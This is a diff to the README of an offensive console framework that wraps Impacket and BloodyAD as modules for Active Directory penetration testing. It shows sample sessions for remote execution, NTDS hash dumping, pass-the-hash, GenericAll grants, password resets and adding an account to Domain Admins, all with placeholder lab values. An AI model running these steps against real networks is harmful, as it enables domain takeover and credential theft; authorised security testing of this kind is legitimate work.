@@ -42,7 +42,7 @@ If `EXEGOL_CONTAINER` is not set, UwU auto-detects running containers starting w
 
 ## Impacket
 
-[Impacket](https://github.com/fortra/impacket) tools are wrapped as UwU modules. Set your globals once, then switch between modules without re-entering credentials.
+Every [Impacket](https://github.com/fortra/impacket) tool is wrapped as an individual UwU module at `impacket/<tool>`. Set your globals once, then switch between 40+ modules without re-entering credentials.
 
 ### Setup
 
@@ -52,141 +52,249 @@ uwu > setg RHOSTS 10.10.10.100
 uwu > setg DOMAIN corp.local
 uwu > setg USER admin
 uwu > setg PASS Password123
+uwu > setg DC_IP 10.10.10.100
 ```
 
-### Modules
+### Available Modules
+
+**Remote Execution:**
 
 | Module | Description |
 |--------|-------------|
-| `ad/kerberoast` | Kerberoast — extract TGS tickets for offline cracking |
-| `ad/asreproast` | AS-REP Roast — extract hashes for accounts without pre-auth |
-| `ad/targeted_kerberoast` | Kerberoast a specific user via SPN manipulation |
-| `ad/kerb_userenum` | Enumerate valid domain usernames via Kerberos |
-| `ad/delegation_exploit` | Exploit constrained/unconstrained delegation |
-| `ad/rbcd_auto` | Full RBCD attack chain (add computer, set delegation, impersonate) |
+| `impacket/psexec` | Remote execution via service creation |
+| `impacket/smbexec` | Execution via SMB services (no binary upload) |
+| `impacket/wmiexec` | Semi-interactive shell via WMI (stealthier) |
+| `impacket/dcomexec` | Execution via DCOM objects |
+| `impacket/atexec` | Execution via Task Scheduler |
 
-### Kerberoast
+**Credential Dumping:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/secretsdump` | Dump SAM/LSA/NTDS secrets remotely |
+| `impacket/mimikatz` | Remote mimikatz execution via RPC |
+
+**Kerberos:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/GetUserSPNs` | Kerberoasting — request SPN tickets |
+| `impacket/GetNPUsers` | AS-REP Roast — no-preauth hash extraction |
+| `impacket/getTGT` | Request a TGT ticket |
+| `impacket/getST` | Request a service ticket (S4U2Self/S4U2Proxy) |
+| `impacket/ticketer` | Create golden/silver tickets |
+| `impacket/ticketConverter` | Convert between ccache and kirbi formats |
+| `impacket/describeTicket` | Parse ticket contents |
+
+**AD Enumeration:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/GetADUsers` | Enumerate AD users via LDAP |
+| `impacket/findDelegation` | Find delegation relationships |
+| `impacket/Get-GPPPassword` | Extract Group Policy Preferences passwords |
+| `impacket/lookupsid` | SID brute-force user enumeration |
+| `impacket/samrdump` | Enumerate SAM users via MSRPC |
+| `impacket/rpcdump` | Dump RPC endpoints |
+
+**AD Abuse:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/addcomputer` | Add a computer account to the domain |
+| `impacket/rbcd` | Resource-Based Constrained Delegation abuse |
+| `impacket/dacledit` | Edit DACLs on AD objects |
+| `impacket/owneredit` | Edit object ownership |
+
+**SMB:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/smbclient` | SMB client — list shares, upload/download |
+| `impacket/smbserver` | Host files via SMB server |
+| `impacket/smbpasswd` | Change SMB password remotely |
+
+**Relay / MiTM:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/ntlmrelayx` | NTLM relay attack tool |
+| `impacket/smbrelayx` | SMB relay attack |
+
+**Other:**
+
+| Module | Description |
+|--------|-------------|
+| `impacket/mssqlclient` | Interactive MSSQL client |
+| `impacket/services` | Manage Windows services remotely |
+| `impacket/reg` | Remote Windows registry operations |
+| `impacket/changepasswd` | Change user password |
+| `impacket/rdp_check` | Check valid RDP credentials |
+| `impacket/raiseChild` | Escalate from child to parent domain |
+
+### Remote Execution Example
 
 ```bash
-uwu > use ad/kerberoast
-uwu kerberoast > options
+uwu > use impacket/psexec
+uwu impacket_psexec > options
 
-  Name          Current     Required  Description
-  ----          -------     --------  -----------
-  RHOSTS        10.10.10.1  yes       Domain Controller IP
-  DOMAIN        corp.local  yes       Domain name
-  USER          admin       yes       Domain username
-  PASS          Password123 yes       Domain password
-  TARGET_USER                no       Specific user to kerberoast
-  OUTPUT        kerberoast  no       Output file for hashes
-  AUTO_CRACK    no           no       Automatically crack via SSH
+  Name        Current       Required  Description
+  ----        -------       --------  -----------
+  RHOSTS      10.10.10.100  yes       Target host/IP
+  USER        admin         yes       Username for authentication
+  PASS        Password123   no        Password
+  DOMAIN      corp.local    no        Domain name
+  HASHES                    no        NTLM hashes (LM:NT format)
+  KERBEROS    no            no        Use Kerberos authentication
+  DC_IP       10.10.10.100  no        Domain controller IP
+  COMMAND                   no        Command to execute
 
-uwu kerberoast > run
+uwu impacket_psexec > run
 ```
 
-### AS-REP Roast
+Interactive tools (psexec, wmiexec, smbexec, dcomexec, mssqlclient) open in a tmux session — `Ctrl+b d` to background, `sessions` to list, `interact <name>` to reattach.
+
+### Credential Dumping Example
 
 ```bash
-uwu > use ad/asreproast
-uwu asreproast > run    # globals already set
+uwu > use impacket/secretsdump
+uwu impacket_secretsdump > set JUST_DC yes
+uwu impacket_secretsdump > run
+
+[*] Auth mode: Password (Domain)
+[*] Dumping NTDS.DIT via DRSUAPI...
+    Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    krbtgt:502:aad3b435b51404ee:...:::
 ```
 
-### Delegation Exploit
+### Pass-the-Hash
 
 ```bash
-uwu > use ad/delegation_exploit
-uwu delegation_exploit > options
-
-  Name              Current       Required  Description
-  ----              -------       --------  -----------
-  RHOSTS            10.10.10.1    yes       Domain Controller IP
-  DOMAIN            corp.local    yes       Domain name
-  USER              admin         yes       Domain username
-  PASS              Password123   yes       Domain password
-  DELEGATION_TYPE   auto          no       auto, constrained, unconstrained, rbcd
-  TARGET                          no       Specific delegation target
-  IMPERSONATE       administrator no       User to impersonate
-  ACTION            auto          no       auto, enumerate, exploit
-
-uwu delegation_exploit > set TARGET svc_sql
-uwu delegation_exploit > run
+uwu > use impacket/wmiexec
+uwu impacket_wmiexec > set HASHES aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+uwu impacket_wmiexec > set COMMAND "whoami"
+uwu impacket_wmiexec > run
 ```
 
-### RBCD Attack Chain
+### Kerberos Clock Skew Fix
 
 ```bash
-uwu > use ad/rbcd_auto
-uwu rbcd_auto > set TARGET DC01$
-uwu rbcd_auto > set IMPERSONATE administrator
-uwu rbcd_auto > run
-
-[*] Step 1: Adding fake computer FAKECOMP$...
-[+] Computer added
-[*] Step 2: Setting RBCD on DC01$...
-[+] Delegation configured
-[*] Step 3: Requesting service ticket as administrator...
-[+] Ticket saved to /tmp/rbcd_auto/administrator.ccache
-```
-
-### Auto-Crack Integration
-
-Kerberoast and AS-REP modules can auto-crack hashes via SSH:
-
-```bash
-uwu kerberoast > set AUTO_CRACK yes
-uwu kerberoast > set SSH_HOST gpu-box
-uwu kerberoast > set WORDLIST /opt/rockyou.txt
-uwu kerberoast > run
-
-[+] 3 hashes extracted
-[*] Sending to gpu-box for cracking...
-[+] Cracked: svc_sql:Password1
+# Use faketime to fix KRB_AP_ERR_SKEW errors
+uwu impacket_getTGT > set FAKETIME "2026-02-15 00:09:00"
+uwu impacket_getTGT > run
 ```
 
 ---
 
 ## BloodyAD
 
-[BloodyAD](https://github.com/CravateRouge/bloodyAD) is wrapped as a UwU module for ACL enumeration and abuse. Globals provide the authentication — you only set the target-specific options.
+Every [BloodyAD](https://github.com/CravateRouge/bloodyAD) operation is wrapped as an individual UwU module at `bloodyad/<operation>`. Each module handles one specific AD abuse action.
 
-### Module
+### Setup
 
 ```bash
-uwu > use ad/bloodyad_validate
-uwu bloodyad_validate > options
-
-  Name          Current      Required  Description
-  ----          -------      --------  -----------
-  RHOSTS        10.10.10.1   yes       Domain Controller IP
-  DOMAIN        corp.local   yes       Domain name
-  USER          admin        yes       Domain username
-  PASS          Password123  yes       Domain password
-  TARGET_USER                no       Target user for object queries
-  TARGET_GROUP               no       Target group for membership queries
-  TARGET_OU                  no       Target OU for children queries
-  MODE          read         no       Test mode: tools_only, read, full
-
-uwu bloodyad_validate > set MODE read
-uwu bloodyad_validate > run
-
-[*] Testing BloodyAD read operations...
-[+] get writable: 12 writable objects found
-[+] get object admin: attributes retrieved
-[+] get membership admin: 3 groups
+# Globals apply to all bloodyad modules
+uwu > setg RHOSTS 10.10.10.100
+uwu > setg DOMAIN corp.local
+uwu > setg USER admin
+uwu > setg PASS Password123
 ```
 
-### Full ACL Abuse Mode
+### Available Modules
+
+**ACL Abuse:**
+
+| Module | Description |
+|--------|-------------|
+| `bloodyad/genericall` | Grant GenericAll on target to trustee |
+| `bloodyad/writedacl` | WriteDACL abuse — grant GenericAll |
+| `bloodyad/remove_genericall` | Remove GenericAll from trustee |
+| `bloodyad/setowner` | Change object ownership (WriteOwner) |
+| `bloodyad/dcsync` | Add DCSync replication rights |
+| `bloodyad/remove_dcsync` | Remove DCSync rights |
+
+**Group Operations:**
+
+| Module | Description |
+|--------|-------------|
+| `bloodyad/addmember` | Add member to group |
+| `bloodyad/removemember` | Remove member from group |
+
+**Credential Abuse:**
+
+| Module | Description |
+|--------|-------------|
+| `bloodyad/setpassword` | Reset user password (ForceChangePassword) |
+| `bloodyad/shadowcreds` | Add shadow credentials to target |
+| `bloodyad/remove_shadowcreds` | Remove shadow credentials |
+
+**Delegation:**
+
+| Module | Description |
+|--------|-------------|
+| `bloodyad/rbcd` | Add RBCD delegation on target |
+| `bloodyad/remove_rbcd` | Remove RBCD delegation |
+
+**Object Management:**
+
+| Module | Description |
+|--------|-------------|
+| `bloodyad/addcomputer` | Add a computer account |
+| `bloodyad/adduser` | Add a user account |
+| `bloodyad/setobject` | Set/modify attribute on AD object |
+| `bloodyad/adduac` | Add UAC flag (e.g., DONT_REQ_PREAUTH) |
+| `bloodyad/removeuac` | Remove UAC flag |
+
+**Enumeration:**
+
+| Module | Description |
+|--------|-------------|
+| `bloodyad/getwritable` | Find objects writable by current user |
+| `bloodyad/getobject` | Retrieve LDAP attributes for an object |
+| `bloodyad/getmembership` | Retrieve group memberships |
+| `bloodyad/getsearch` | Search LDAP with custom filter |
+| `bloodyad/dnsdump` | Dump all DNS records |
+
+### GenericAll Example
 
 ```bash
-uwu bloodyad_validate > set MODE full
-uwu bloodyad_validate > set TARGET_USER victim
-uwu bloodyad_validate > set TARGET_GROUP "Domain Admins"
-uwu bloodyad_validate > run
+uwu > use bloodyad/genericall
+uwu bloody_genericall > options
 
-[*] Testing BloodyAD write operations...
-[+] add groupMember: victim added to Domain Admins
-[+] set password: victim password reset
-[+] add shadowCredentials: key credential added
+  Name      Current       Required  Description
+  ----      -------       --------  -----------
+  RHOSTS    10.10.10.100  yes       Domain Controller IP
+  DOMAIN    corp.local    yes       Domain name
+  USER      admin         yes       Username
+  PASS      Password123   no        Password or LM:NT hash
+  HASHES                  no        NTLM hashes (LM:NT format)
+  TARGET                  yes       Target object (sAMAccountName)
+  TRUSTEE                 yes       Principal to grant GenericAll to
+
+uwu bloody_genericall > set TARGET DC01$
+uwu bloody_genericall > set TRUSTEE svc_sql
+uwu bloody_genericall > run
+
+[+] GenericAll granted on DC01$ to svc_sql
+[*] To undo: use bloodyad/remove_genericall
+```
+
+### Password Reset Example
+
+```bash
+uwu > use bloodyad/setpassword
+uwu bloody_setpassword > set TARGET victim
+uwu bloody_setpassword > set NEW_PASS NewPassword123!
+uwu bloody_setpassword > run
+```
+
+### Add to Domain Admins Example
+
+```bash
+uwu > use bloodyad/addmember
+uwu bloody_addmember > set GROUP "Domain Admins"
+uwu bloody_addmember > set MEMBER attacker
+uwu bloody_addmember > run
 ```
 
 ---
